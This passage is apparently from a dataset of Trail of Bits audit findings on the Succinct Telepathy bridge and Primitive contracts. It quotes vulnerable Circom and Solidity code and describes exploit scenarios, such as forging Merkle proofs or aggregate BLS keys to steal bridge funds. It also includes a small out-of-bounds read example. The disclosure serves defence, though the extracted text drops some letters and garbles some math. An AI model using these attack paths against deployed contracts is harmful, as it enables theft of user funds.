participation array. By setting all other participation bits in that subtree to zero, Alice can force EllipticCurveAddUnequal to be called on A+B and C . Using the underconstrained point addition formula, she can prove that the sum of these points is equal to the next subtree root, and repeat until she has arbitrarily selected the aggregated public key. Alice can then forge a signature for an arbitrary block header and steal all user funds. Recommendations Short term, change G1Add to use EllipticCurveAdd , which correctly handles equal inputs. Long term, review all uses of EllipticCurveAddUnequal to ensure that the inputs have dierent X components.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. EllipticCurveAdd mishandles points at innity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The EllipticCurveAdd and EllipticCurveAddFp2 templates contain a logic bug when handling points at innity, which can cause them to return incorrect results for specic sequences of elliptic curve point additions. The EllipticCurveAdd template is currently unused in the Telepathy codebase, while EllipticCurveAddFp2 is used only in the context of cofactor clearing during the hash-to-curve process. Because the bug is triggered only in special sequences of operations, as described below, the random inputs generated by the hashing process are extremely unlikely to trigger the bug. However, if EllipticCurveAdd were to be used in the future (e.g., as we recommend in TOB-SUCCINCT-3 ), this bug may be exploitable using carefully chosen malicious inputs. Figure 4.1 shows the logic, contained in EllipticCurveAdd and EllipticCurveAddFp2 , that determines whether the point returned from EllipticCurveAdd is the point at innity. // If isInfinity = 1, replace `out` with `a` so if `a` was on curve, so is output ... // out = O iff ( a = O AND b = O ) OR ( x_equal AND NOT y_equal ) signal ab0; ab0 <== aIsInfinity * bIsInfinity; signal anegb; anegb <== x_equal.out - x_equal.out * y_equal.out; isInfinity <== ab0 + anegb - ab0 * anegb; // OR gate Figure 4.1: telepathy/circuits/circuits/pairing/curve.circom#344349 When point A is the point at innity, represented in projective coordinates as (X, Y, 0) , and B is the point (X, -Y, 1) , EllipticCurveAdd should return B unchanged and in particular should set isInfinity to zero. However, because the x_equal AND NOT y_equal clause is satised, the EllipticCurveAdd function returns A (a point at innity). This edge case is reachable by computing the sequence of additions (A - A) - A , for any point A , which will return O instead of the correct result of -A . This edge case was rst noted in a GitHub issue ( #13 ) in the upstream yi-sun/circom-pairing library. We discovered that the edge case is in fact reachable via the sequence above and upstreamed a patch . Exploit Scenario The Succinct Labs developers modify the G1Add template as recommended in TOB-SUCCINCT-3 . A malicious sync committee member then constructs public keys such that the G1Add process produces a sequence of additions that trigger the bug. Honest provers then cannot create proofs due to the miscomputed aggregate public key, causing funds to become stuck in the bridge. Recommendations Short term, update the pairing circuits to match the latest version of yi-sun/circom-pairing . Long term, consider making the pairing and SHA-256 libraries npm dependencies or Git submodules so that developers can easily keep up to date with security xes in the upstream libraries.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Circom circuits lack adequate testing framework ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The Telepathy Circom circuits do not have functioning unit tests or a systematic testing framework. Running the end-to-end circuit tests requires a large amount of RAM, disk space, and CPU time, and is infeasible on typical developer machines. Because it is dicult to rapidly develop and run tests, new code changes are likely to be insuciently tested before deployment. The presence of a testing framework greatly aids security engineers, as it allows for the rapid adaptation of testing routines into security testing routines. Recommendations Short term, begin writing unit tests for each sub-circuit and requiring tests for all new code. Long term, implement a framework for rapidly running all unit tests as well as end-to-end tests on scaled-down versions of the full circuits.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Poseidon commitment uses a non-standard hash construction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "Telepathy commits to the set of sync committee public keys with a Poseidon-based hash function. This hash function uses a construction with poor theoretical properties. The hash is computed by PoseidonFieldArray , using a MerkleDamgrd construction with circomlib s Poseidon template as the compression function: template PoseidonFieldArray(LENGTH) { signal input in [LENGTH]; signal output out ; var POSEIDON_SIZE = 15 ; var NUM_HASHERS = (LENGTH \\ POSEIDON_SIZE) + 1 ; component hashers[NUM_HASHERS]; for ( var i = 0 ; i < NUM_HASHERS; i++) { if (i > 0 ) { POSEIDON_SIZE = 16 ; } hashers[i] = Poseidon(POSEIDON_SIZE); for ( var j = 0 ; j < 15 ; j++) { if (i * 15 + j >= LENGTH ) { hashers[i].inputs[j] <== 0 ; } else { hashers[i].inputs[j] <== in [i*15 + j]; } } if (i > 0 ) { hashers[i].inputs[15] <== hashers[i- 1]. out ; } } out <== hashers[NUM_HASHERS-1]. out ; } Figure 6.1: telepathy/circuits/circuits/poseidon.circom#2551 The Poseidon authors recommend using a sponge construction, which has better provable security properties than the MD construction. One could implement a sponge by using PoseidonEx with nOuts = 1 for intermediate calls and nOuts = 2 for the nal call. For each call, out[0] should be passed into the initialState of the next PoseidonEx component, and out[1] should be used for the nal output. By maintaining out[0] as hidden capacity, the overall construction will closely approximate a pseudorandom function. Although the MD construction oers sucient protection against collision for the current commitment use case, hash functions constructed in this manner do not fully model random functions. Future uses of the PoseidonFieldArray circuit may expect stronger cryptographic properties, such as resistance to length extension. Additionally, by utilizing the initialState input, as shown in gure 6.2, on each permutation call, 16 inputs can be compressed per template instantiation, as opposed to the current 15, without any additional cost per compression. This will reduce the number of compressions required and thus reduce the size of the circuit. template PoseidonEx(nInputs, nOuts) { signal input inputs[nInputs]; signal input initialState; signal output out [nOuts]; Figure 6.2: circomlib/circuits/poseidon.circom#6770 Recommendations Short term, convert PoseidonFieldArray to use a sponge construction, ensuring that out[0] is preserved as a hidden capacity value. Long term, ensure that all hashing primitives are used in accordance with the published recommendations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Merkle root reconstruction is vulnerable to forgery via proofs of incorrect length ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The TargetAMB contract accepts and veries Merkle proofs that a particular smart contract event was issued in a particular Ethereum 2.0 beacon block. Because the proof validation depends on the length of the proof rather than the index of the value to be proved, Merkle proofs with invalid lengths can be used to mislead the verier and forge proofs for nonexistent transactions. The SSZ.restoreMerkleRoot function reconstructs a Merkle root from the user-supplied transaction receipt and Merkle proof; the light client then compares the root against the known-good value stored in the LightClient contract. The index argument to restoreMerkleRoot determines the specic location in the block state tree at which the leaf node is expected to be found. The arguments leaf and branch are supplied by the prover, while the index argument is calculated by the smart contract verier. function restoreMerkleRoot ( bytes32 leaf , uint256 index , bytes32 [] memory branch) internal pure returns ( bytes32 ) { } bytes32 value = leaf; for ( uint256 i = 0 ; i < branch.length; i++) { if ((index / ( 2 ** i)) % 2 == 1 ) { value = sha256( bytes .concat(branch[i], value)); } else { value = sha256( bytes .concat(value, branch[i])); } } return value; Figure 7.1: telepathy/contracts/src/libraries/SimpleSerialize.sol#2438 A malicious user may supply a proof (i.e., a branch list) that is longer or shorter than the number of bits in the index . In this case, the leaf value will not in fact correspond to the receiptRoot but to some other value in the tree. In particular, the user can convince the smart contract that receiptRoot is the value at any generalized index given by truncating the leftmost bits of the true index or by extending the index by arbitrarily many zeroes following the leading set bit. If one of these alternative indexes contains data controllable by the user, who may for example be the block proposer, then the user can forge a proof for a transaction that did not occur and thus steal funds from bridges relying on the TargetAMB . Exploit Scenario Alice, a malicious ETH2.0 validator, encodes a fake transaction receipt hash encoding a deposit to a cross-chain bridge into the graffiti eld of a BeaconBlock . She then waits for the block to be added to the HistoricalBlocks tree and further for the generalized index of the historical block to coincide with an allowable index for the Merkle tree reconstruction. She then calls executeMessageFromLog with the transaction receipt, allowing her to withdraw from the bridge based on a forged proof of deposit and steal funds. Recommendations Short term, rewrite restoreMerkleRoot to loop over the bits of index , e.g. with a while loop terminating when index = 1 . Long term, ensure that proof verication routines do not use control ow determined by untrusted input. The verication routine for each statement to be proven should treat all possible proofs uniformly.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. LightClient forced nalization could allow bad updates in case of a DoS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "Under periods of delayed nality, the LightClient may nalize block headers with few validators participating. If the Telepathy provers were targeted by a denial-of-service (DoS) attack, this condition could be triggered and used by a malicious validator to take control of the LightClient and nalize malicious block headers. The LightClient contract typically considers a block header to be nalized if it is associated with a proof that more than two-thirds of sync committee participants have signed the header. Typically, the sync committee for the next period is determined from a nalized block in the current period. However, in the case that the end of the sync committee period is reached before any block containing a sync committee update is nalized, a user may call the LightClient.force function to apply the update with the most signatures, even if that update has less than a majority of signatures. A forced update may have as few as 10 participating signers, as determined by the constant MIN_SYNC_COMMITTEE_PARTICIPANTS . /// @notice In the case there is no finalization for a sync committee rotation, this method /// is used to apply the rotate update with the most signatures throughout the period. /// @param period The period for which we are trying to apply the best rotate update for. function force ( uint256 period ) external { LightClientRotate memory update = bestUpdates[period]; uint256 nextPeriod = period + 1 ; if (update.step.finalizedHeaderRoot == 0 ) { revert( \"Best update was never initialized\" ); } else if (syncCommitteePoseidons[nextPeriod] != 0 ) { revert( \"Sync committee for next period already initialized.\" ); } else if (getSyncCommitteePeriod(getCurrentSlot()) < nextPeriod) { revert( \"Must wait for current sync committee period to end.\" ); } setSyncCommitteePoseidon(nextPeriod, update.syncCommitteePoseidon); } Figure 8.1: telepathy/contracts/src/lightclient/LightClient.sol#123 Proving sync committee updates via the rotate ZK circuit requires signicant computational power; it is likely that there will be only a few provers online at any given time. In this case, a DoS attack against the active provers could cause the provers to be oine for a full sync committee period (~27 hours), allowing the attacker to force an update with a small minority of validator stake. The attacker would then gain full control of the light client and be able to steal funds from any systems dependent on the correctness of the light client. Exploit Scenario Alice, a malicious ETH2.0 validator, controls about 5% of the total validator stake, split across many public keys. She waits for a sync committee period, includes at least 10 of her public keys, then launches a DoS against the active Telepathy provers, using an attack such as that described in TOB-SUCCINCT-1 or an attack against the ochain prover/relayer client itself. Alice creates a forged beacon block with a new sync committee containing only her own public keys, then uses her 10 active committee keys to sign the block. She calls LightClient.rotate with this forged block and waits until the sync committee period ends, nally calling LightClient.force to gain control over all future light client updates. Recommendations Short term, consider removing the LightClient.force function, extending the waiting period before updates may be forced, or introducing a privileged role to mediate forced updates. Long term, explicitly document expected liveness behavior and associated safety tradeos.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. G1AddMany does not check for the point at innity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The G1AddMany circuit aggregates multiple public keys into a single public key before verifying the BLS signature. The outcome of the aggregation is used within CoreVerifyPubkeyG1 as the public key. However, G1AddMany ignores the value of the nal out_bits , and wrongly converts a point at innity to a dierent point when all participation bits are zero. template G1AddMany(SYNC_COMMITTEE_SIZE, LOG_2_SYNC_COMMITTEE_SIZE, N, K) { signal input pubkeys[SYNC_COMMITTEE_SIZE][ 2 ][K]; signal input bits[SYNC_COMMITTEE_SIZE]; signal output out[ 2 ][K]; [...] for ( var i = 0 ; i < 2 ; i++) { for ( var j = 0 ; j < K; j++) { out[i][j] <== reducers[LOG_2_SYNC_COMMITTEE_SIZE- 1 ].out[ 0 ][i][j]; } } } Figure 9.1: BLS key aggregation without checks for all-zero participation bits ( telepathy/circuits/circuits/bls.circom#1648 ) Recommendations Short term, augment the G1AddMany template with an output signal that indicates whether the aggregated public key is the point at innity. Check that the aggregated public key is non-zero in the calling circuit by verifying that the output of G1AddMany is not the point at innity (for instance, in VerifySyncCommitteeSignature ). Long term, assert that all provided elliptic curve points are non-zero before converting them to ane form and using them where a non-zero point is expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. TargetAMB receipt proof may behave unexpectedly on future transaction types ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The TargetAMB contract can relay transactions from the SourceAMB via events logged in transaction receipts. The contract currently ignores the version specier in these receipts, which could cause unexpected behavior in future upgrade hard-forks. To relay a transaction from a receipt, the user provides a Merkle proof that a particular transaction receipt is present in a specied block; the relevant event is then parsed from the transaction receipt by the TargetAMB . function getEventTopic (...){ ... bytes memory value = MerklePatriciaProofVerifier.extractProofValue(receiptRoot, key, proofAsRLP); RLPReader.RLPItem memory valueAsItem = value.toRlpItem(); if (!valueAsItem.isList()) { // TODO: why do we do this ... valueAsItem.memPtr++; valueAsItem.len--; } RLPReader.RLPItem[] memory valueAsList = valueAsItem.toList(); require (valueAsList.length == 4 , \"Invalid receipt length\" ); // In the receipt, the 4th entry is the logs RLPReader.RLPItem[] memory logs = valueAsList[ 3 ].toList(); require (logIndex < logs.length, \"Log index out of bounds\" ); RLPReader.RLPItem[] memory relevantLog = logs[logIndex].toList(); ... } Figure 10.1: telepathy/contracts/src/libraries/StateProofHelper.sol#L44L82 The logic in gure 10.1 checks if the transaction receipt is an RLP list; if it is not, the logic skips one byte of the receipt before continuing with parsing. This logic is required in order to properly handle legacy transaction receipts as dened in EIP-2718 . Legacy transaction receipts directly contain the RLP-encoded list rlp([status, cumulativeGasUsed, logsBloom, logs]) , whereas EIP- TransactionType|| TransactionPayload , where TransactionType is a one-byte indicator between 0x00 and 0x7f and TransactionPayload may vary depending on the transaction type. Current valid transaction types are 0x01 and 0x02 . New transaction types may be added during routine Ethereum upgrade hard-forks. The TransactionPayload eld of type 0x01 and 0x02 transactions corresponds exactly to the LegacyTransactionReceipt format; thus, simply skipping the initial byte is sucient to handle these cases. However, EIP-2718 does not guarantee this backward compatibility, and future hard-forks may introduce transaction types for which this parsing method gives incorrect results. Because the current implementation lacks explicit validation of the transaction type, this discrepancy may go unnoticed and lead to unexpected behavior. Exploit Scenario An Ethereum upgrade fork introduces a new transaction type with a corresponding transaction receipt format that diers from the legacy format. If the new format has the same number of elds but with dierent semantics in the fourth slot, it may be possible for a malicious user to insert into that slot a value that parses as an event log for a transaction that did not take place, thus forging an arbitrary bridge message. Recommendations Short term, check the rst byte of valueAsItem against a list of allowlisted transaction types, and revert if the transaction type is invalid. Long term, plan for future incompatibilities due to upgrade forks; for example, consider adding a semi-trusted role responsible for adding new transaction type identiers to an allowlist.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. RLPReader library does not validate proper RLP encoding ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The TargetAMB uses the external RLPReader dependency to parse RLP-encoded nodes in the Ethereum state trie, including those provided by the user as part of a Merkle proof. When parsing a byte string as an RLPItem , the library does not check that the encoded payload length of the RLPitem matches the length of the underlying bytes. /* * @param item RLP encoded bytes */ function toRlpItem ( bytes memory item) internal pure returns (RLPItem memory ) { uint256 memPtr ; assembly { memPtr := add(item, 0x20 ) } return RLPItem(item.length, memPtr); } Figure 11.1: Solidity-RLP/contracts/RLPReader.sol#5161 If the encoded byte length of the RLPitem is too long or too short, future operations on the RLPItem may access memory before or after the bounds of the underlying buer. More generally, because the Merkle trie verier assumes that all input is in the form of valid RLP-encoded data, it is important to check that potentially malicious data is properly encoded. While we did not identify any way to convert improperly encoded proof data into a proof forgery, it is simple to give an example of an out-of-bounds read that could possibly lead in other contexts to unexpected behavior. In gure 11.2, the result of items[0].toBytes() contains many bytes read from memory beyond the bounds allocated in the initial byte string. RLPReader.RLPItem memory item = RLPReader.toRlpItem( '\\xc3\\xd0' ); RLPReader.RLPItem[] memory items = item.toList(); assert(items[ 0 ].toBytes().length == 16 ); Figure 11.2: Out-of-of-bounds read due to invalid RLP encoding In this example, RLPReader.toRLPItem should revert because the encoded length of three bytes is longer than the payload length of the string; similarly, the call to toList() should fail because the nested RLPItem encodes a length of 16, again more than the underlying buer. To prevent such ill-constructed nested RLPItem s, the internal numItems function should revert if currPtr is not exactly equal to endPtr at the end of the loop shown in gure 11.3. // @return number of payload items inside an encoded list. function numItems (RLPItem memory item) private pure returns ( uint256 ) { if (item.len == 0 ) return 0 ; uint256 count = 0 ; uint256 currPtr = item.memPtr + _payloadOffset(item.memPtr); uint256 endPtr = item.memPtr + item.len; while (currPtr < endPtr) { currPtr = currPtr + _itemLength(currPtr); // skip over an item count++; } return count; } Figure 11.3: Solidity-RLP/contracts/RLPReader.sol#256269 Recommendations Short term, add a check in RLPReader.toRLPItem that validates that the length of the argument exactly matches the expected length of prex + payload based on the encoded prex. Similarly, add a check in RLPReader.numItems , checking that the sum of the encoded lengths of sub-objects matches the total length of the RLP list. Long term, treat any length values or pointers in untrusted data as potentially malicious and carefully check that they are within the expected bounds.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. TargetAMB _executeMessage lacks contract existence checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "When relaying messages on the target chain, the TargetAMB records the success or failure of the external contract call so that o-chain clients can track the success of their messages. However, if the recipient of the call is an externally owned-account or is otherwise empty, the handleTelepathy call will appear to have succeeded when it was not processed by any recipient. bytes memory recieveCall = abi.encodeWithSelector( ITelepathyHandler.handleTelepathy.selector, message.sourceChainId, message.senderAddress, message.data ); address recipient = TypeCasts.bytes32ToAddress(message.recipientAddress); (status,) = recipient.call(recieveCall); if (status) { messageStatus[messageRoot] = MessageStatus.EXECUTION_SUCCEEDED; } else { messageStatus[messageRoot] = MessageStatus.EXECUTION_FAILED; } Figure 12.1: telepathy/contracts/src/amb/TargetAMB.sol#150164 Exploit Scenario A user accidentally sends a transaction to the wrong address or an address that does not exist on the target chain. The UI displays the transaction as successful, possibly confusing the user further. Recommendations Short term, change the handleTelepathy interface to expect a return value and check that the return value is some magic constant, such as the four-byte ABI selector. See OpenZeppelins safeTransferFrom / IERC721Reciever pattern for an example. Long term, ensure that all low-level calls behave as expected when handling externally owned accounts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. LightClient is unable to verify some block headers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The LightClient contract expects beacon block headers produced in a period prior to the period in which they are nalized to be signed by the wrong sync committee; those blocks will not be validated by the LightClient , and AMB transactions in these blocks may be delayed. The Telepathy light client tracks only block headers that are nalized, as dened by the ETH2.0 Casper nality mechanism. Newly proposed, unnalized beacon blocks contain a finalized_checkpoint eld with the most recently nalized block hash. The Step circuit currently exports only the slot number of this nested, nalized block as a public input. The LightClient contract uses this slot number to determine which sync committee it expects to sign the update. However, the correct slot number for this use is in fact that of the wrapping, unnalized block. In some cases, such as near the edge of a sync committee period or during periods of delayed nalization, the two slots may not belong to the same sync committee period. In this case, the signature will fail to verify, and the LightClient will become unable to validate the block header. Exploit Scenario A user sends an AMB message using the SourceAMB.sendViaLog function. The beacon block in which this execution block is included is late within a sync committee period and is not nalized on the beacon chain until the next period. The new sync committee signs the block, but this signature is rejected by the light client because it expects a signature from the old committee. Because this header cannot be nalized in the light client, the TargetAMB cannot relay the message until some future block in the new sync committee period is nalized in the light client, causing delivery delays. Recommendations Short term, Include attestedSlot in the public input commitment to the Step circuit. This can be achieved at no extra cost by packing the eight-byte attestedSlot value alongside the eight-byte finalizedSlot value, which currently is padded to 32 bytes. Long term, add additional unit and end-to-end tests to focus on cases where blocks are near the edges of epochs and sync committee periods. Further, reduce gas usage and circuit complexity by packing all public inputs to the step function into a single byte array that is hashed in one pass, rather than chaining successive calls to SHA-256, which reduces the eective rate by half and incurs overhead due to the additional external precompile calls.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. OptSimpleSWU2 Y-coordinate output is underconstrained ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf",
        "body": "The OptSimpleSWU2 circuit does not check that its Y-coordinate output is a properly formatted BigInt. This violates the canonicity assumptions of the Fp2Sgn0 circuit and other downstream components, possibly leading to unexpected nondeterminism in the sign of the output of MapToG2 . Incorrect results from MapToG2 would cause the circuit to verify the provided signature against a message dierent from that in the public input. While this does not allow malicious provers to forge signatures on arbitrary messages, this additional degree of freedom in witness generation could interact negatively with future changes to the codebase or instantiations of this circuit. var Y[2][50]; ... component Y_sq = Fp2Multiply(n, k, p); // Y^ 2 == g(X) for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++){ out [1][i][idx] <-- Y[i][idx]; Y_sq.a[i][idx] <== out [1][i][idx]; Y_sq.b[i][idx] <== out [1][i][idx]; } for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++){ Y_sq. out [i][idx] === isSquare * (gX0. out [i][idx] - gX1. out [i][idx]) + gX1. out [i][idx]; } // sgn0(Y) == sgn0(t) component sgn_Y = Fp2Sgn0(n, k, p); for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++) sgn_Y. in [i][idx] <== out [1][i][idx]; sgn_Y. out === sgn_in. out ; Figure 14.1: telepathy/circuits/circuits/pairing/bls12_381_hash_to_G2.circom#199226 A malicious prover can generate a witness where that Y-coordinate is not in its canonical representation. OptSimpleSWU2 calls Fp2Sgn0 , which in turn calls FpSgn0 . Although FpSgn0 checks that its input is less than p using BigLessThan , that is not sucient to guarantee that its input is canonical. BigLessThan allows limbs of its inputs to be greater than or equal to 2 n , so long as the dierence a[i]-b[i] is in . Violating FpSgn0 s   ) , 2 [ 2 assumption that the limbs are all in casesfor example, if FpSgn0 s output is incorrect, MapToG2 could return a point with an incorrect sign. could lead to unexpected behavior in some  ) [ 0 , 2 template FpSgn0(n, k, p){ signal input in [k]; signal output out ; // constrain in < p component lt = BigLessThan(n, k); for ( var i= 0 ; i<k; i++){ lt.a[i] <== in [i]; lt.b[i] <== p[i]; } lt. out === 1 ; // note we only need in [0] ! var r = in [0] % 2 ; var q = ( in [0] - r) / 2 ; out <-- r; signal div; div <-- q; out * ( 1 - out ) === 0 ; in [0] === 2 * div + out ; } Figure 14.2: telepathy/circuits/circuits/pairing/fp.circom#229249 Exploit Scenario A malicious prover can use a malformed BigInt to change the computed sign of the out signal of OptSimpleSWU2 at proving time. That changed sign will cause the rest of the circuit to accept certain incorrect values in place of H(m) when checking the BLS signature. The prover could then successfully generate a proof with certain malformed signatures. Recommendations Short term, use Num2Bits to constrain the Y-coordinate output of OptSimpleSWU2 to be a well-formed BigInt . Long term, clearly document and validate the representation of the output values in templates such as OptSimpleSWU2 .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Transfer operations may silently fail due to the lack of contract existence checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The pool fails to check that a contract exists before performing transfers. As a result, the pool may assume that failed transactions involving destroyed tokens or tokens that have not yet been deployed were successful. Transfers.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom use low-level calls to perform transfers without conrming the contracts existence: ) internal { ( bool success , bytes memory returnData) = address (token).call( abi.encodeWithSelector(token.transfer.selector, to, value) ); require (success && (returnData.length == 0 || abi.decode(returnData, ( bool ))), \"Transfer fail\" ); } Figure 1.1: rmm-core/contracts/libraries/Transfers.sol#16-21 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.2: The Solidity documentation details the necessity of executing existence checks before performing low-level calls. Therefore, if the tokens to be transferred have not yet been deployed or have been destroyed, safeTransfer and safeTransferFrom will return success even though the transfer was not executed. Exploit Scenario The pool contains two tokens: A and B. The A token has a bug, and the contract is destroyed. Bob is not aware of the issue and swaps 1,000 B tokens for A tokens. Bob successfully transfers 1,000 B tokens to the pool but does not receive any A tokens in return. As a result, Bob loses 1,000 B tokens. Recommendations Short term, implement a contract existence check before the low-level calls in Transfer.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom . This will ensure that a swap will revert if the token to be bought no longer exists, preventing the pool from accepting the token to be sold without returning any tokens in exchange. Long term, avoid implementing low-level calls. If such calls are unavoidable, carefully review the Solidity documentation , particularly the Warnings section, before implementing them to ensure that they are implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "Although dependency scans did not indicate a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Anyone could steal pool tokens earned interest ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "If a PrimitiveEngine contract is deployed with certain ERC20 tokens, unexpected token interest behavior could allow token interest to count toward the number of tokens required for the deposit , allocate , create , and swap functions, allowing the user to avoid paying in full. Liquidity providers use the deposit function to increase the liquidity in a position. The following code within the function veries that the pool has received at least the minimum number of tokens required by the protocol: if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); Figure 3.1: rmm-core/contracts/PrimitiveEngine.sol#213-217 Assume that both delRisky and delStable are positive. First, the code fetches the current balances of the tokens. Next, the depositCallback function is called to transfer the required number of each token to the pool contract. Finally, the code veries that each tokens balance has increased by at least the required amount. There could be a token that allows token holders to earn interest simply because they are token holders. To retrieve this interest, token holders could call a certain function to calculate the interest earned and increase their balances. An attacker could call this function from within the depositCallback function to pay out interest to the pool contract. This would increase the pools token balance, decreasing the number of tokens that the user needs to transfer to the pool contract to pass the balance check (i.e., the check conrming that the balance has suciently increased). In eect, the users token payment obligation is reduced because the interest accounts for part of the required balance increase. To date, we have not identied a token contract that contains such a functionality; however, it is possible that one exists or could be created. Exploit Scenario Bob deploys a PrimitiveEngine contract with token1 and token2. Token1 allows its holders to earn passive interest. Anyone can call get_interest(address) to make a certain token holders interest be claimed and added to the token holders balance. Over time, the pool can claim 1,000 tokens. Eve calls deposit , and the pool requires Eve to send 1,000 tokens. Eve calls get_interest(address) in the depositCallback function instead of sending the tokens, depositing to the pool without paying the minimum required tokens. Recommendations Short term, add documentation explaining to users that the use of interest-earning tokens can reduce the standard payments for deposit , allocate , create , and swap . Long term, using the Token Integration Checklist (appendix C), generate a document detailing the shortcomings of tokens with certain features and the impacts of their use in the Primitive protocol. That way, users will not be alarmed if the use of a token with nonstandard features leads to unexpected results.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The Primitive contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Primitive contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Lack of zero-value checks on functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. function deposit( address recipient, uint256 delRisky, uint256 delStable, bytes calldata data ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins[recipient].deposit(delRisky, delStable); // state update uint256 balRisky; uint256 balStable; if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); } Figure 5.1: rmm-core/contracts/PrimitiveEngine.sol#L201-L219 Among others, the following functions lack zero-value checks on their arguments:  PrimitiveEngine.deposit  PrimitiveEngine.withdraw  PrimitiveEngine.allocate  PrimitiveEngine.swap  PositionDescriptor.constructor  MarginManager.deposit  MarginManager.withdraw  SwapManager.swap  CashManager.unwrap  CashManager.sweepToken Exploit Scenario Alice, a user, mistakenly provides the zero address as an argument when depositing for a recipient. As a result, her funds are saved in the margins of the zero address instead of a dierent address. Recommendations 